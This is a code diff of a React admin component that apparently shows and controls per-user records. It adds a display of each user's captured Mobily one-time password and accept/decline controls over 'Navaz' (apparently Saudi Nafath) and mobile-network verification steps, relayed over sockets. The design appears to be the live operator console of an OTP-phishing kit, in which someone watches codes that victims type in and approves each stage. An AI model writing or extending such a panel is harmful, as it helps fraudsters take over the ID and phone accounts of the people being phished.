@@ -233,14 +233,14 @@ const Main = () => {
 
   const handleAcceptNavaz = async (id) => {
     socket.emit("acceptNavaz", id);
-    setUser({ data: { ...user.data, navazAceept: true }, active: true });
+    setUser({ data: { ...user.data, navazAccept: true }, active: true });
     await getUsers();
   };
 
   const handleDeclineNavaz = async (id) => {
     socket.emit("declineNavaz", id);
     setUser({
-      data: { ...user.data, navazAceept: true, networkAccept: false },
+      data: { ...user.data, navazAccept: true, networkAccept: false },
       active: true,
     });
     await getUsers();
@@ -668,11 +668,20 @@ const Main = () => {
                 ) : (
                   ""
                 )}
+                {user.data.mobOtp ? (
+                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
+                    <span> موبايلي Otp</span>
+                    <span>{user.data?.mobOtp}</span>
+                  </div>
+                ) : (
+                  ""
+                )}
 
                 {user.data.phoneAccept &&
                   user.data.phoneNetwork === "Mobily" &&
                   !user.data.networkAccept && (
                     <>
+                      <span>قبول شبكة موبايلي</span>
                       <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                         <button
                           className="bg-green-500 w-1/2 p-2 rounded-lg"
@@ -693,9 +702,8 @@ const Main = () => {
                 {}
                 {user.data.phoneAccept &&
                 user.data.phoneNetwork === "Mobily" &&
-                user.data.networkAccept &&
-                user.data.mobOtp &&
-                !user.data.navazAceept ? (
+                (user.data.networkAccept || user.data.mobOtp) &&
+                user.data.navazAccept ? (
                   // <>
                   //   <input
                   //     className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
@@ -763,6 +771,7 @@ const Main = () => {
                   user.data.mobOtp &&
                   !user.data.mobOtpAccept && (
                     <>
+                      قبول موبايلي otp
                       <input
                         className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                         value={price}
@@ -874,6 +883,7 @@ const Main = () => {
                 ) : (
                   ""
                 )}
+
                 {!user.data.networkAccept ? (
                   user.data.navazAceept ? (
                     "تم الرد"
